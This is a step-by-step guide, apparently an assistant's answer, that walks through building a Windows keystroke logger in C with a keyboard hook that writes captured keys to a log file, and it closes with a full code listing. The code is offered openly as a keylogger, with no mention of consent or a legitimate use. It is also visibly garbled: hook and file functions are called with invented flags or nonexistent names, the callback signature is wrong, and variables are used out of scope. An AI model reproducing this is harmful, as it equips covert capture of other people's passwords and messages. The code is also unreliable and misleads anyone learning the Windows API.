To create a keystroke logger on a Windows computer, you can use the Windows API to set up a keyboard hook. Here's a step-by-step guide:

### Step 1: Include Necessary Headers
Include the required headers for the Windows API functions.

```c
#include <Windows.h>
#include <WinUser.h>
#include <stdio.h>
#include <time.h>
```

### Step 2: Define the Key Logger Function
Define a function to handle keyboard events.

```c
void KeyLoggerSetup(HWND hwnd, int nKeysToLog, char* logFile);
```

### Step 3: Implement the Callback Function
The callback function will handle key presses.

```c
LRESULT CALLBACK KeyLoggerCallback(int nCode, WPARAM wParam, LPARAM lParam, UINT_PTR* dwReferrer, bool* bHandled);
```

### Step 4: Set Up the Keyboard Hook
In the main function, set up the hook and start logging.

```c
int main(int argc, char* argv) {
    HWND hwnd = GetDesktopWindow();
    char* logFile = "keyboard.log";

    if (!CreateFile(logFile, GENERIC_READ, FILE_WRITE, NULL, CREATE_ALWAYS, FILE_TEXT, 0)) {
        printf("Failed to create log file!\n");
        return 1;
    }

    KeyLoggerSetup(hwnd, 0, logFile);

    return 0;
}
```

### Step 5: Implement the Callback Handler
The callback function processes each key event.

```c
LRESULT CALLBACK KeyLoggerCallback(int nCode, WPARAM wParam, LPARAM lParam, UINT_PTR* dwReferrer, bool* bHandled) {
    if (!lParam) {
        return false;
    }

    byte key = (byte)wParam;
    bool isKeyDown = (wParam >> 31) & 1;
    bool isShift = (wParam >> 5) & 1;

    if (wParam == VK_KEYDOWN || wParam == VK_KEYUP) {
        if (isKeyDown) {
            if (key > ' ', fputc(key, logFile), fflush(logFile));
        }
        if (isShift && (key == ' ' || key == 9)) {
            fputc('^', logFile);
            fflush(logFile);
        }
    }

    *bHandled = true;
    return true;
}
```

### Step 6: Set Up the Logger
Implement the setup function that installs the hook.

```c
void KeyLoggerSetup(HWND hwnd, int nKeysToLog, char* logFile) {
    HHOOK hKeyboardHook = SetWindowsHook(hwnd, WH_KEYBOARD_LL, KeyLoggerCallback);

    if (hKeyboardHook == NULL) {
        printf("Failed to install keyboard hook!\n");
    } else {
        printf("Keyboard hook installed. Logging to %s.\n", logFile);

        while (true) {
            Sleep(100);
            // Continue processing or exit the loop when desired
        }
    }
}
```

### Step 7: Release the Hook
Properly release the hook when done.

```c
void ReleaseHook(HHOOK hhook) {
    if (hhook) {
        UnhookKeyboard(hhook);
    }
}
```

### Step 8: Full Code
Here's the complete code:

```c
#include <Windows.h>
#include <WinUser.h>
#include <stdio.h>
#include <time.h>

void KeyLoggerSetup(HWND hwnd, int nKeysToLog, char* logFile);
LRESULT CALLBACK KeyLoggerCallback(int nCode, WPARAM wParam, LPARAM lParam, UINT_PTR* dwReferrer, bool* bHandled);

int main(int argc, char* argv) {
    HWND hwnd = GetDesktopWindow();
    char* logFile = "keyboard.log";

    if (!CreateFile(logFile, GENERIC_READ, FILE_WRITE, NULL, CREATE_ALWAYS, FILE_TEXT, 0)) {
        printf("Failed to create log file!\n");
        return 1;
    }

    KeyLoggerSetup(hwnd, 0, logFile);

    return 0;
}

LRESULT CALLBACK KeyLoggerCallback(int nCode, WPARAM wParam, LPARAM lParam, UINT_PTR* dwReferrer, bool* bHandled) {
    if (!lParam) {
        return false;
    }

    byte key = (byte)wParam;
    bool isKeyDown = (wParam >> 31) & 1;
    bool isShift = (wParam >> 5) & 1;

    if (wParam == VK_KEYDOWN || wParam == VK_KEYUP) {
        if (isKeyDown) {
            if (key > ' ', fputc(key, logFile), fflush(logFile));
        }
        if (isShift && (key == ' ' || key == 9)) {
            fputc('^', logFile);
            fflush(logFile);
        }
    }

    *bHandled = true;
    return true;
}

void KeyLoggerSetup(HWND hwnd, int nKeysToLog, char* logFile) {
    HHOOK hKeyboardHook = SetWindowsHook(hwnd, WH_KEYBOARD_LL, KeyLoggerCallback);

    if (hKeyboardHook == NULL) {
        printf("Failed to install keyboard hook!\n");
    } else {
        printf("Keyboard hook installed. Logging to %s.\n", logFile);

        while (true) {
            Sleep(100);
        }
    }
}

void ReleaseHook(HHOOK hhook) {
    if (hhook) {
        UnhookKeyboard(hhook);
    }
}
```

### Notes:
- **Log File Creation**: The log file is created in the same directory as the executable. Ensure you have the necessary permissions to write to this file.
